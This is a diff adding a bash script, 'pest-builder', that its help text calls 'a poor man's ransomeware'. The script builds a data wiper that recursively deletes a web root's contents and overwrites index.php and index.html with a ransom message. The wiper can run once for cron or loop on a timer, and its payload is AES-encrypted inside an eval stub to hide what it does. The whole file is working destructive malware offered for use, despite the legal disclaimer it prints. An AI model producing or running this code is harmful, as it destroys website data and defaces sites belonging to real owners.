@@ -1,0 +1,181 @@
+#!/usr/bin/env bash
+
+# MIT License
+# 
+# Copyright (c) 2023 Robert Paul
+# 
+# Permission is hereby granted, free of charge, to any person obtaining a copy
+# of this software and associated documentation files (the "Software"), to deal
+# in the Software without restriction, including without limitation the rights
+# to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
+# copies of the Software, and to permit persons to whom the Software is
+# furnished to do so, subject to the following conditions:
+# 
+# The above copyright notice and this permission notice shall be included in all
+# copies or substantial portions of the Software.
+# 
+# THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
+# IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
+# FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
+# AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
+# LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
+# OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
+# SOFTWARE.
+
+usage="
+
+Usage: ./pest-builder [OPTIONS]
+
+Description:
+  A poor man's ransomeware
+
+Options:
+  -h, --help                Display this help message and exit.
+  -type, --type             Type of output file.
+  -o, --output FILE         Write output to FILE.
+  -target, --target PATH    Absolute path to target directory.
+  -m, --message TEXT        Your ransom message.
+  -s, --sleep SECONDS       Number of seconds to sleep after each wipe.
+
+Examples:
+    ./pest -o './.cron_wiper' --type cron --target '/home/test/public_html' --message 'Pwned'
+
+    ./pest -o './.loop_wiper' --type loop --target '/home/test/public_html' --message 'Pwned' --sleep 20
+
+";
+
+args=("$@");
+
+while [[ $# -gt 0 ]]; do
+  key="$1"
+  case $key in
+    -h|--help)
+      echo "$usage";
+      exit 0
+      ;;
+    -type|--type)
+      type="$2";
+      shift
+      ;;
+    -o|--output)
+      output_file="$2"
+      shift 2
+      ;;
+    -target|--target)
+      target="$2"
+      shift 2
+      ;;
+    -m|--message)
+      message="$2"
+      shift 2
+      ;;
+    -s|--sleep)
+      sleepseconds="$2"
+      shift 2
+      ;;
+    *)                  
+      shift
+      ;;
+  esac
+done
+
+set -- "${args[@]}";
+
+if [[ "$type" = "loop" ]] && [[ -z "$sleepseconds" ]]; then
+  echo "$usage";
+  exit 1;
+fi
+
+if [[ "$type" != "loop" ]] && [[ "$type" != "cron" ]]; then
+  printf "%s" "Invalid type\n\n";
+  echo "$usage";
+  exit 1;
+fi;
+
+if [[ "$type" = "cron" ]] && [[ "$#" != 8 ]]; then
+  echo "$usage";
+  exit 1;
+fi;  
+
+if [[ "$type" = "loop" ]] && [[ "$#" != 10 ]]; then
+  echo "$usage";
+  exit 1;
+fi;
+
+[[ -z "$type" ]] || [[ -z "$target" ]] || [[ -z "$output_file" ]] || [[ -z "$message" ]] && echo "$usage" && exit 1;
+
+template=$(cat <<TPL
+#!/usr/bin/env bash
+
+declare -r WEBROOT=
+declare -r RANSOM_MESSAGE=
+declare -r SLEEP_TIME=
+
+function clear_dir() {
+    [ ! -e "\$1" ] || [ ! -d "\$1" ] && return;
+    cd "\$1" || exit > /dev/null 2>&1;
+    [ "\$PWD" != "\$1" ] && return;
+    [ "\$(ls -a \$1)" ] && rm * -rf > /dev/null 2>&1;    
+}
+
+function act() {
+    clear_dir "\$WEBROOT";
+    echo -e "\$RANSOM_MESSAGE" >"\$WEBROOT/index.php";
+    echo -e "\$RANSOM_MESSAGE" >"\$WEBROOT/index.html";
+}
+
+TPL
+);
+
+loop_template=$(cat <<TPL
+while true; do
+    act;
+    sleep \$SLEEP_TIME;
+done
+TPL
+);
+
+
+legal_disclaimer=$(cat << TPL
+
+[!] Legal Disclaimer: Using this piece of software to generate code for use against targets without prior mutual consent is illegal. I assume no liability and bear no responsibility for any misuse or damage caused by this program.
+
+TPL
+);
+    
+echo -e "$legal_disclaimer";
+
+
+template=${template//-r WEBROOT=/-r WEBROOT=\"$target\";}
+template=${template//-r RANSOM_MESSAGE=/-r RANSOM_MESSAGE=\"$message\";}
+
+key=$(openssl rand -hex 32);iv=$(openssl rand -hex 16);
+
+if [[ "$type" = "loop" ]]; then
+    c="$template\n\n$loop_template"; 
+    c=${c//-r SLEEP_TIME=/-r SLEEP_TIME=\"$sleepseconds\";};     
+    encrypted=$(echo -e -n "$c" | openssl enc -aes-256-cbc -K "$key" -iv "$iv" -e -a);
+    encrypted=$(cat << TPL
+#!/usr/bin/env bash
+decrypted=\$(printf "%s" "$encrypted" | openssl enc -aes-256-cbc -K "$key" -iv "$iv" -d -a);
+eval "\$decrypted";
+TPL
+);
+    echo -e "$encrypted" > "$output_file";       
+    echo -e "\n\nLoop wiper created."
+    exit
+
+elif [[ "$type" = "cron" ]]; then 
+    template=${template//declare -r SLEEP_TIME=/};        
+    c="$template\n\nact\n";             
+    encrypted=$(echo -e -n "$c" | openssl enc -aes-256-cbc -K "$key" -iv "$iv" -e -a);
+    encrypted=$(cat << TPL
+#!/usr/bin/env bash
+decrypted=\$(printf "%s" "$encrypted" | openssl enc -aes-256-cbc -K "$key" -iv "$iv" -d -a);
+eval "\$decrypted";
+TPL
+);
+    echo -e "$encrypted" > "$output_file";     
+    echo -e "\n\nCron wiper created.";
+    exit;
+fi
